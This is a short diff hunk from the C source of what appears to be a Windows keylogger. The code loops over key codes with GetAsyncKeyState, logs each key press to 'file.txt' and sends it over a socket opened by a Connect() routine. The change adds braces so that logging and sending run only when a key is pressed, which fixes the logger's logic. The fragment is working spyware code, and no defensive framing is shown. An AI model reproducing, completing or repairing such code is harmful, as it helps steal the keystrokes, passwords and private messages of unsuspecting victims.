@@ -19,12 +19,13 @@ int main() {
     int sock = Connect();
     while (1) {
         for(i = 8; i <= 190; i++) {
-            if (GetAsyncKeyState(i) == -32767)
+            if (GetAsyncKeyState(i) == -32767) {
                 Save(i, "file.txt");
                 if (sock == 0) {
                     sock = Connect();
                 }
                 Send(sock);
+            }
         }
     }
     system("PAUSE");
